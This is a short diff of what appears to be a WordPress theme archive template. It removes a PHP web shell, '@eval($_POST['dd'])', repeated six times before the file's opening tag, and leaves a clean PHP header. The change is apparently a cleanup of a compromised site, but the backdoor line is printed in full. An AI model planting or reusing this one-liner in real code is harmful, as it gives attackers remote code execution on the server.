@@ -1,4 +1,4 @@
-<?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?><?php
+<?php
 /**
  * The template for displaying archive pages
  *
